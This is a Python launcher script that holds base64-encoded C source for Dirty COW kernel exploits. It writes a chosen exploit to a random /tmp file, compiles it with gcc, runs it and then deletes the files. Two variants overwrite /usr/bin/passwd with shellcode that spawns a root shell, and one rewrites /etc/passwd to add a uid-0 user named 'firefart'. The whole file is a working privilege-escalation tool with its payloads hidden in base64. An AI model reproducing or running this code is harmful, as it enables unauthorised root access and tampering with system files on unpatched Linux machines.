import base64
import os
import random
import string
import subprocess
import sys


class DirtyCow:
    #I know there is some bad stuff in here - thats only here for compatibility with python 2
    based_dirtycow32 = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0Kdm9pZCAqbWFwOw0KaW50IGY7DQppbnQgc3RvcCA9IDA7DQpzdHJ1Y3Qgc3RhdCBzdDsNCmNoYXIgKm5hbWU7DQpwdGhyZWFkX3QgcHRoMSxwdGgyLHB0aDM7DQoNCmNoYXIgc3VpZF9iaW5hcnlbXSA9ICIvdXNyL2Jpbi9wYXNzd2QiOw0KDQp1bnNpZ25lZCBjaGFyIHNjW10gPSB7DQogIDB4N2YsIDB4NDUsIDB4NGMsIDB4NDYsIDB4MDEsIDB4MDEsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDIsIDB4MDAsIDB4MDMsIDB4MDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4NTQsIDB4ODAsIDB4MDQsIDB4MDgsIDB4MzQsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MzQsIDB4MDAsIDB4MjAsIDB4MDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4MDAsIDB4ODAsIDB4MDQsIDB4MDgsIDB4MDAsIDB4ODAsIDB4MDQsIDB4MDgsIDB4ODgsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4YmMsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDcsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MTAsIDB4MDAsIDB4MDAsDQogIDB4MzEsIDB4ZGIsIDB4NmEsIDB4MTcsIDB4NTgsIDB4Y2QsIDB4ODAsIDB4NmEsIDB4MGIsIDB4NTgsIDB4OTksIDB4NTIsDQogIDB4NjYsIDB4NjgsIDB4MmQsIDB4NjMsIDB4ODksIDB4ZTcsIDB4NjgsIDB4MmYsIDB4NzMsIDB4NjgsIDB4MDAsIDB4NjgsDQogIDB4MmYsIDB4NjIsIDB4NjksIDB4NmUsIDB4ODksIDB4ZTMsIDB4NTIsIDB4ZTgsIDB4MGEsIDB4MDAsIDB4MDAsIDB4MDAsDQogIDB4MmYsIDB4NjIsIDB4NjksIDB4NmUsIDB4MmYsIDB4NjIsIDB4NjEsIDB4NzMsIDB4NjgsIDB4MDAsIDB4NTcsIDB4NTMsDQogIDB4ODksIDB4ZTEsIDB4Y2QsIDB4ODANCn07DQp1bnNpZ25lZCBpbnQgc2NfbGVuID0gMTM2Ow0KDQoNCnZvaWQgKm1hZHZpc2VUaHJlYWQodm9pZCAqYXJnKQ0Kew0KICAgIGNoYXIgKnN0cjsNCiAgICBzdHI9KGNoYXIqKWFyZzsNCiAgICBpbnQgaSxjPTA7DQogICAgZm9yKGk9MDtpPDEwMDAwMDAgJiYgIXN0b3A7aSsrKSB7DQogICAgICAgIGMrPW1hZHZpc2UobWFwLDEwMCxNQURWX0RPTlRORUVEKTsNCiAgICB9DQogICAgcHJpbnRmKCJ0aHJlYWQgc3RvcHBlZFxuIik7DQp9DQoNCnZvaWQgKnByb2NzZWxmbWVtVGhyZWFkKHZvaWQgKmFyZykNCnsNCiAgICBjaGFyICpzdHI7DQogICAgc3RyPShjaGFyKilhcmc7DQogICAgaW50IGY9b3BlbigiL3Byb2Mvc2VsZi9tZW0iLE9fUkRXUik7DQogICAgaW50IGksYz0wOw0KICAgIGZvcihpPTA7aTwxMDAwMDAwICYmICFzdG9wO2krKykgew0KICAgICAgICBsc2VlayhmLG1hcCxTRUVLX1NFVCk7DQogICAgICAgIGMrPXdyaXRlKGYsIHN0ciwgc2NfbGVuKTsNCiAgICB9DQogICAgcHJpbnRmKCJ0aHJlYWQgc3RvcHBlZFxuIik7DQp9DQoNCnZvaWQgKndhaXRGb3JXcml0ZSh2b2lkICphcmcpIHsNCiAgICBjaGFyIGJ1ZltzY19sZW5dOw0KDQogICAgZm9yKDs7KSB7DQogICAgICAgIEZJTEUgKmZwID0gZm9wZW4oc3VpZF9iaW5hcnksICJyYiIpOw0KDQogICAgICAgIGZyZWFkKGJ1Ziwgc2NfbGVuLCAxLCBmcCk7DQoNCiAgICAgICAgaWYobWVtY21wKGJ1Ziwgc2MsIHNjX2xlbikgPT0gMCkgew0KICAgICAgICAgICAgcHJpbnRmKCIlcyBvdmVyd3JpdHRlblxuIiwgc3VpZF9iaW5hcnkpOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCg0KICAgICAgICBmY2xvc2UoZnApOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICB9DQoNCiAgICBzdG9wID0gMTsNCg0KICAgIHByaW50ZigiUG9wcGluZyByb290IHNoZWxsLlxuIik7DQogICAgcHJpbnRmKCJEb24ndCBmb3JnZXQgdG8gcmVzdG9yZSAvdG1wL2Jha1xuIik7DQoNCiAgICBzeXN0ZW0oc3VpZF9iaW5hcnkpOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYyxjaGFyICphcmd2W10pIHsNCiAgICBjaGFyICpiYWNrdXA7DQoNCiAgICBwcmludGYoIkRpcnR5Q293IHJvb3QgcHJpdmlsZWdlIGVzY2FsYXRpb25cbiIpOw0KICAgIHByaW50ZigiQmFja2luZyB1cCAlcyB0byAvdG1wL2Jha1xuIiwgc3VpZF9iaW5hcnkpOw0KDQogICAgYXNwcmludGYoJmJhY2t1cCwgImNwICVzIC90bXAvYmFrIiwgc3VpZF9iaW5hcnkpOw0KICAgIHN5c3RlbShiYWNrdXApOw0KDQogICAgZiA9IG9wZW4oc3VpZF9iaW5hcnksT19SRE9OTFkpOw0KICAgIGZzdGF0KGYsJnN0KTsNCg0KICAgIHByaW50ZigiU2l6ZSBvZiBiaW5hcnk6ICVkXG4iLCBzdC5zdF9zaXplKTsNCg0KICAgIGNoYXIgcGF5bG9hZFtzdC5zdF9zaXplXTsNCiAgICBtZW1zZXQocGF5bG9hZCwgMHg5MCwgc3Quc3Rfc2l6ZSk7DQogICAgbWVtY3B5KHBheWxvYWQsIHNjLCBzY19sZW4rMSk7DQoNCiAgICBtYXAgPSBtbWFwKE5VTEwsc3Quc3Rfc2l6ZSxQUk9UX1JFQUQsTUFQX1BSSVZBVEUsZiwwKTsNCg0KICAgIHByaW50ZigiUmFjaW5nLCB0aGlzIG1heSB0YWtlIGEgd2hpbGUuLlxuIik7DQoNCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMSwgTlVMTCwgJm1hZHZpc2VUaHJlYWQsIHN1aWRfYmluYXJ5KTsNCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMiwgTlVMTCwgJnByb2NzZWxmbWVtVGhyZWFkLCBwYXlsb2FkKTsNCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMywgTlVMTCwgJndhaXRGb3JXcml0ZSwgTlVMTCk7DQoNCiAgICBwdGhyZWFkX2pvaW4ocHRoMywgTlVMTCk7DQoNCiAgICByZXR1cm4gMDsNCn0NCg=="
    based_dirtycow64 = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0Kdm9pZCAqbWFwOw0KaW50IGY7DQppbnQgc3RvcCA9IDA7DQpzdHJ1Y3Qgc3RhdCBzdDsNCmNoYXIgKm5hbWU7DQpwdGhyZWFkX3QgcHRoMSxwdGgyLHB0aDM7DQoNCg0KY2hhciBzdWlkX2JpbmFyeVtdID0gIi91c3IvYmluL3Bhc3N3ZCI7DQoNCg0KdW5zaWduZWQgY2hhciBzY1tdID0gew0KICAweDdmLCAweDQ1LCAweDRjLCAweDQ2LCAweDAyLCAweDAxLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAyLCAweDAwLCAweDNlLCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAweDAwLA0KICAweDc4LCAweDAwLCAweDQwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQwLCAweDAwLCAweDAwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQwLCAweDAwLCAweDM4LCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweDA3LCAweDAwLCAweDAwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLA0KICAweGIxLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweGVhLCAweDAwLCAweDAwLCAweDAwLA0KICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDEwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLA0KICAweDQ4LCAweDMxLCAweGZmLCAweDZhLCAweDY5LCAweDU4LCAweDBmLCAweDA1LCAweDZhLCAweDNiLCAweDU4LCAweDk5LA0KICAweDQ4LCAweGJiLCAweDJmLCAweDYyLCAweDY5LCAweDZlLCAweDJmLCAweDczLCAweDY4LCAweDAwLCAweDUzLCAweDQ4LA0KICAweDg5LCAweGU3LCAweDY4LCAweDJkLCAweDYzLCAweDAwLCAweDAwLCAweDQ4LCAweDg5LCAweGU2LCAweDUyLCAweGU4LA0KICAweDBhLCAweDAwLCAweDAwLCAweDAwLCAweDJmLCAweDYyLCAweDY5LCAweDZlLCAweDJmLCAweDYyLCAweDYxLCAweDczLA0KICAweDY4LCAweDAwLCAweDU2LCAweDU3LCAweDQ4LCAweDg5LCAweGU2LCAweDBmLCAweDA1DQp9Ow0KdW5zaWduZWQgaW50IHNjX2xlbiA9IDE3NzsNCiANCnZvaWQgKm1hZHZpc2VUaHJlYWQodm9pZCAqYXJnKQ0Kew0KICAgIGNoYXIgKnN0cjsNCiAgICBzdHI9KGNoYXIqKWFyZzsNCiAgICBpbnQgaSxjPTA7DQogICAgZm9yKGk9MDtpPDEwMDAwMDAgJiYgIXN0b3A7aSsrKSB7DQogICAgICAgIGMrPW1hZHZpc2UobWFwLDEwMCxNQURWX0RPTlRORUVEKTsNCiAgICB9DQogICAgcHJpbnRmKCJ0aHJlYWQgc3RvcHBlZFxuIik7DQp9DQoNCnZvaWQgKnByb2NzZWxmbWVtVGhyZWFkKHZvaWQgKmFyZykNCnsNCiAgICBjaGFyICpzdHI7DQogICAgc3RyPShjaGFyKilhcmc7DQogICAgaW50IGY9b3BlbigiL3Byb2Mvc2VsZi9tZW0iLE9fUkRXUik7DQogICAgaW50IGksYz0wOw0KICAgIGZvcihpPTA7aTwxMDAwMDAwICYmICFzdG9wO2krKykgew0KICAgICAgICBsc2VlayhmLG1hcCxTRUVLX1NFVCk7DQogICAgICAgIGMrPXdyaXRlKGYsIHN0ciwgc2NfbGVuKTsNCiAgICB9DQogICAgcHJpbnRmKCJ0aHJlYWQgc3RvcHBlZFxuIik7DQp9DQoNCnZvaWQgKndhaXRGb3JXcml0ZSh2b2lkICphcmcpIHsNCiAgICBjaGFyIGJ1ZltzY19sZW5dOw0KDQogICAgZm9yKDs7KSB7DQogICAgICAgIEZJTEUgKmZwID0gZm9wZW4oc3VpZF9iaW5hcnksICJyYiIpOw0KDQogICAgICAgIGZyZWFkKGJ1Ziwgc2NfbGVuLCAxLCBmcCk7DQoNCiAgICAgICAgaWYobWVtY21wKGJ1Ziwgc2MsIHNjX2xlbikgPT0gMCkgew0KICAgICAgICAgICAgcHJpbnRmKCIlcyBvdmVyd3JpdHRlblxuIiwgc3VpZF9iaW5hcnkpOw0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCg0KICAgICAgICBmY2xvc2UoZnApOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICB9DQoNCiAgICBzdG9wID0gMTsNCg0KICAgIHByaW50ZigiUG9wcGluZyByb290IHNoZWxsLlxuIik7DQogICAgcHJpbnRmKCJEb24ndCBmb3JnZXQgdG8gcmVzdG9yZSAvdG1wL2Jha1xuIik7DQoNCiAgICBzeXN0ZW0oc3VpZF9iaW5hcnkpOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYyxjaGFyICphcmd2W10pIHsNCiAgICBjaGFyICpiYWNrdXA7DQoNCiAgICBwcmludGYoIkRpcnR5Q293IHJvb3QgcHJpdmlsZWdlIGVzY2FsYXRpb25cbiIpOw0KICAgIHByaW50ZigiQmFja2luZyB1cCAlcyB0byAvdG1wL2Jha1xuIiwgc3VpZF9iaW5hcnkpOw0KDQogICAgYXNwcmludGYoJmJhY2t1cCwgImNwICVzIC90bXAvYmFrIiwgc3VpZF9iaW5hcnkpOw0KICAgIHN5c3RlbShiYWNrdXApOw0KDQogICAgZiA9IG9wZW4oc3VpZF9iaW5hcnksT19SRE9OTFkpOw0KICAgIGZzdGF0KGYsJnN0KTsNCg0KICAgIHByaW50ZigiU2l6ZSBvZiBiaW5hcnk6ICVkXG4iLCBzdC5zdF9zaXplKTsNCg0KICAgIGNoYXIgcGF5bG9hZFtzdC5zdF9zaXplXTsNCiAgICBtZW1zZXQocGF5bG9hZCwgMHg5MCwgc3Quc3Rfc2l6ZSk7DQogICAgbWVtY3B5KHBheWxvYWQsIHNjLCBzY19sZW4rMSk7DQoNCiAgICBtYXAgPSBtbWFwKE5VTEwsc3Quc3Rfc2l6ZSxQUk9UX1JFQUQsTUFQX1BSSVZBVEUsZiwwKTsNCg0KICAgIHByaW50ZigiUmFjaW5nLCB0aGlzIG1heSB0YWtlIGEgd2hpbGUuLlxuIik7DQoNCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMSwgTlVMTCwgJm1hZHZpc2VUaHJlYWQsIHN1aWRfYmluYXJ5KTsNCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMiwgTlVMTCwgJnByb2NzZWxmbWVtVGhyZWFkLCBwYXlsb2FkKTsNCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMywgTlVMTCwgJndhaXRGb3JXcml0ZSwgTlVMTCk7DQoNCiAgICBwdGhyZWFkX2pvaW4ocHRoMywgTlVMTCk7DQoNCiAgICByZXR1cm4gMDsNCn0NCg=="
    based_dirtycow_passwd = "I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxwdGhyZWFkLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN5cy9tbWFuLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNpbmNsdWRlIDxzeXMvd2FpdC5oPgojaW5jbHVkZSA8c3lzL3B0cmFjZS5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPGNyeXB0Lmg+Cgpjb25zdCBjaGFyICpmaWxlbmFtZSA9ICIvZXRjL3Bhc3N3ZCI7CmNvbnN0IGNoYXIgKmJhY2t1cF9maWxlbmFtZSA9ICIvdG1wL3Bhc3N3ZC5iYWsiOwpjb25zdCBjaGFyICpzYWx0ID0gImZpcmVmYXJ0IjsKCmludCBmOwp2b2lkICptYXA7CnBpZF90IHBpZDsKcHRocmVhZF90IHB0aDsKc3RydWN0IHN0YXQgc3Q7CgpzdHJ1Y3QgVXNlcmluZm8gewogICBjaGFyICp1c2VybmFtZTsKICAgY2hhciAqaGFzaDsKICAgaW50IHVzZXJfaWQ7CiAgIGludCBncm91cF9pZDsKICAgY2hhciAqaW5mbzsKICAgY2hhciAqaG9tZV9kaXI7CiAgIGNoYXIgKnNoZWxsOwp9OwoKY2hhciAqZ2VuZXJhdGVfcGFzc3dvcmRfaGFzaChjaGFyICpwbGFpbnRleHRfcHcpIHsKICByZXR1cm4gY3J5cHQocGxhaW50ZXh0X3B3LCBzYWx0KTsKfQoKY2hhciAqZ2VuZXJhdGVfcGFzc3dkX2xpbmUoc3RydWN0IFVzZXJpbmZvIHUpIHsKICBjb25zdCBjaGFyICpmb3JtYXQgPSAiJXM6JXM6JWQ6JWQ6JXM6JXM6JXNcbiI7CiAgaW50IHNpemUgPSBzbnByaW50ZihOVUxMLCAwLCBmb3JtYXQsIHUudXNlcm5hbWUsIHUuaGFzaCwKICAgIHUudXNlcl9pZCwgdS5ncm91cF9pZCwgdS5pbmZvLCB1LmhvbWVfZGlyLCB1LnNoZWxsKTsKICBjaGFyICpyZXQgPSBtYWxsb2Moc2l6ZSArIDEpOwogIHNwcmludGYocmV0LCBmb3JtYXQsIHUudXNlcm5hbWUsIHUuaGFzaCwgdS51c2VyX2lkLAogICAgdS5ncm91cF9pZCwgdS5pbmZvLCB1LmhvbWVfZGlyLCB1LnNoZWxsKTsKICByZXR1cm4gcmV0Owp9Cgp2b2lkICptYWR2aXNlVGhyZWFkKHZvaWQgKmFyZykgewogIGludCBpLCBjID0gMDsKICBmb3IoaSA9IDA7IGkgPCAyMDAwMDAwMDA7IGkrKykgewogICAgYyArPSBtYWR2aXNlKG1hcCwgMTAwLCBNQURWX0RPTlRORUVEKTsKICB9CiAgcHJpbnRmKCJtYWR2aXNlICVkXG5cbiIsIGMpOwp9CgppbnQgY29weV9maWxlKGNvbnN0IGNoYXIgKmZyb20sIGNvbnN0IGNoYXIgKnRvKSB7CiAgLy8gY2hlY2sgaWYgdGFyZ2V0IGZpbGUgYWxyZWFkeSBleGlzdHMKICBpZihhY2Nlc3ModG8sIEZfT0spICE9IC0xKSB7CiAgICBwcmludGYoIkZpbGUgJXMgYWxyZWFkeSBleGlzdHMhIFBsZWFzZSBkZWxldGUgaXQgYW5kIHJ1biBhZ2FpblxuIiwKICAgICAgdG8pOwogICAgcmV0dXJuIC0xOwogIH0KCiAgY2hhciBjaDsKICBGSUxFICpzb3VyY2UsICp0YXJnZXQ7CgogIHNvdXJjZSA9IGZvcGVuKGZyb20sICJyIik7CiAgaWYoc291cmNlID09IE5VTEwpIHsKICAgIHJldHVybiAtMTsKICB9CiAgdGFyZ2V0ID0gZm9wZW4odG8sICJ3Iik7CiAgaWYodGFyZ2V0ID09IE5VTEwpIHsKICAgICBmY2xvc2Uoc291cmNlKTsKICAgICByZXR1cm4gLTE7CiAgfQoKICB3aGlsZSgoY2ggPSBmZ2V0Yyhzb3VyY2UpKSAhPSBFT0YpIHsKICAgICBmcHV0YyhjaCwgdGFyZ2V0KTsKICAgfQoKICBwcmludGYoIiVzIHN1Y2Nlc3NmdWxseSBiYWNrZWQgdXAgdG8gJXNcbiIsCiAgICBmcm9tLCB0byk7CgogIGZjbG9zZShzb3VyY2UpOwogIGZjbG9zZSh0YXJnZXQpOwoKICByZXR1cm4gMDsKfQoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkKewogIC8vIGJhY2t1cCBmaWxlCiAgaW50IHJldCA9IGNvcHlfZmlsZShmaWxlbmFtZSwgYmFja3VwX2ZpbGVuYW1lKTsKICBpZiAocmV0ICE9IDApIHsKICAgIGV4aXQocmV0KTsKICB9CgogIHN0cnVjdCBVc2VyaW5mbyB1c2VyOwogIC8vIHNldCB2YWx1ZXMsIGNoYW5nZSBhcyBuZWVkZWQKICB1c2VyLnVzZXJuYW1lID0gImZpcmVmYXJ0IjsKICB1c2VyLnVzZXJfaWQgPSAwOwogIHVzZXIuZ3JvdXBfaWQgPSAwOwogIHVzZXIuaW5mbyA9ICJwd25lZCI7CiAgdXNlci5ob21lX2RpciA9ICIvcm9vdCI7CiAgdXNlci5zaGVsbCA9ICIvYmluL2Jhc2giOwoKICBjaGFyICpwbGFpbnRleHRfcHc7CgogIGlmIChhcmdjID49IDIpIHsKICAgIHBsYWludGV4dF9wdyA9IGFyZ3ZbMV07CiAgICBwcmludGYoIlBsZWFzZSBlbnRlciB0aGUgbmV3IHBhc3N3b3JkOiAlc1xuIiwgcGxhaW50ZXh0X3B3KTsKICB9IGVsc2UgewogICAgcGxhaW50ZXh0X3B3ID0gZ2V0cGFzcygiUGxlYXNlIGVudGVyIHRoZSBuZXcgcGFzc3dvcmQ6ICIpOwogIH0KCiAgdXNlci5oYXNoID0gZ2VuZXJhdGVfcGFzc3dvcmRfaGFzaChwbGFpbnRleHRfcHcpOwogIGNoYXIgKmNvbXBsZXRlX3Bhc3N3ZF9saW5lID0gZ2VuZXJhdGVfcGFzc3dkX2xpbmUodXNlcik7CiAgcHJpbnRmKCJDb21wbGV0ZSBsaW5lOlxuJXNcbiIsIGNvbXBsZXRlX3Bhc3N3ZF9saW5lKTsKCiAgZiA9IG9wZW4oZmlsZW5hbWUsIE9fUkRPTkxZKTsKICBmc3RhdChmLCAmc3QpOwogIG1hcCA9IG1tYXAoTlVMTCwKICAgICAgICAgICAgIHN0LnN0X3NpemUgKyBzaXplb2YobG9uZyksCiAgICAgICAgICAgICBQUk9UX1JFQUQsCiAgICAgICAgICAgICBNQVBfUFJJVkFURSwKICAgICAgICAgICAgIGYsCiAgICAgICAgICAgICAwKTsKICBwcmludGYoIm1tYXA6ICVseFxuIiwodW5zaWduZWQgbG9uZyltYXApOwogIHBpZCA9IGZvcmsoKTsKICBpZihwaWQpIHsKICAgIHdhaXRwaWQocGlkLCBOVUxMLCAwKTsKICAgIGludCB1LCBpLCBvLCBjID0gMDsKICAgIGludCBsPXN0cmxlbihjb21wbGV0ZV9wYXNzd2RfbGluZSk7CiAgICBmb3IoaSA9IDA7IGkgPCAxMDAwMC9sOyBpKyspIHsKICAgICAgZm9yKG8gPSAwOyBvIDwgbDsgbysrKSB7CiAgICAgICAgZm9yKHUgPSAwOyB1IDwgMTAwMDA7IHUrKykgewogICAgICAgICAgYyArPSBwdHJhY2UoUFRSQUNFX1BPS0VURVhULAogICAgICAgICAgICAgICAgICAgICAgcGlkLAogICAgICAgICAgICAgICAgICAgICAgbWFwICsgbywKICAgICAgICAgICAgICAgICAgICAgICooKGxvbmcqKShjb21wbGV0ZV9wYXNzd2RfbGluZSArIG8pKSk7CiAgICAgICAgfQogICAgICB9CiAgICB9CiAgICBwcmludGYoInB0cmFjZSAlZFxuIixjKTsKICB9CiAgZWxzZSB7CiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoLAogICAgICAgICAgICAgICAgICAgTlVMTCwKICAgICAgICAgICAgICAgICAgIG1hZHZpc2VUaHJlYWQsCiAgICAgICAgICAgICAgICAgICBOVUxMKTsKICAgIHB0cmFjZShQVFJBQ0VfVFJBQ0VNRSk7CiAgICBraWxsKGdldHBpZCgpLCBTSUdTVE9QKTsKICAgIHB0aHJlYWRfam9pbihwdGgsTlVMTCk7CiAgfQoKICBwcmludGYoIkRvbmUhIENoZWNrICVzIHRvIHNlZSBpZiB0aGUgbmV3IHVzZXIgd2FzIGNyZWF0ZWQuXG4iLCBmaWxlbmFtZSk7CiAgcHJpbnRmKCJZb3UgY2FuIGxvZyBpbiB3aXRoIHRoZSB1c2VybmFtZSAnJXMnIGFuZCB0aGUgcGFzc3dvcmQgJyVzJy5cblxuIiwKICAgIHVzZXIudXNlcm5hbWUsIHBsYWludGV4dF9wdyk7CiAgICBwcmludGYoIlxuRE9OJ1QgRk9SR0VUIFRPIFJFU1RPUkUhICQgbXYgJXMgJXNcbiIsCiAgICBiYWNrdXBfZmlsZW5hbWUsIGZpbGVuYW1lKTsKICByZXR1cm4gMDsKfQogICAgICAgICAgICAKIAo="
    extension = ".c"
    versions = ("", "")

    def __init__(self):
        self.temporary_c_file = None
        self.temporary_file = None

    def unbase(self, based_dirty_cow):
        return base64.b64decode(based_dirty_cow.encode())

    def random_file_path(self):
        alphabet = string.ascii_letters + string.digits
        tmp = "/tmp"
        file_name = "".join([random.choice(alphabet) for _ in range(8)])
        return os.path.join(tmp, file_name)

    def write_to_tmp_file(self, based_dirty_cow):
        self.temporary_file = self.random_file_path()
        self.temporary_c_file = self.temporary_file + self.extension
        with open(self.temporary_c_file, "wb") as file:
            unbased_dirty_cow = self.unbase(based_dirty_cow)
            file.write(unbased_dirty_cow)

    def get_gcc(self):
        try:
            process_output = subprocess.Popen(["which", "gcc"], stdout=subprocess.PIPE).communicate()[0]
        except subprocess.CalledProcessError:
            return None

        return process_output.strip().decode()

    def compile_tmp_file(self):
        command = [self.get_gcc(), self.temporary_c_file, "-o", self.temporary_file, "-lcrypt", "-pthread"]
        with open(os.devnull, 'w') as devnull_handle:
            subprocess.call(command, stderr=devnull_handle, stdout=devnull_handle)


    def run_tmp_file(self):
        subprocess.check_call(self.temporary_file)

    def is_64_bit(self):
        return sys.maxsize > 2**32

    def clean(self):
        os.unlink(self.temporary_file)
        os.unlink(self.temporary_c_file)
        
    def _run_dirty_cow(self, based_dirtycow):
        self.write_to_tmp_file(based_dirtycow)
        self.compile_tmp_file()
        self.run_tmp_file()
        self.clean()

    def run_dirty_cow(self):
        correct_dirty_cow = [self.based_dirtycow32, self.based_dirtycow64][self.is_64_bit()]
        print(self.is_64_bit())
        self._run_dirty_cow(correct_dirty_cow)

    def run_replace_dirty_cow(self):
        self._run_dirty_cow(self.based_dirtycow_passwd)

    def run(self):
        print("Running dirtycow now!")
        #self.run_dirty_cow()
        self.run_replace_dirty_cow()
        print("DONE!")

    def cli(self):
        print("Running CowLauncher by dotPY!")
        print("Choose which dirty cow you want!")
        cow_functions = [self.run_dirty_cow, self.run_replace_dirty_cow]
        for i, cow_function in enumerate(cow_functions):
            print("[%s] - %s" % (str(i), cow_function.__name__))
        number = None
        while number not in range(len(cow_functions)):
            try:
                number = int(self.do_input("type a number and hit enter to choose dirty cow: "))
            except ValueError:
                pass
        cow_functions[number]()

    def do_input(self, prompt):
        try:
            return raw_input(prompt)
        except NameError:
            return input(prompt)

c = DirtyCow()
c.cli()
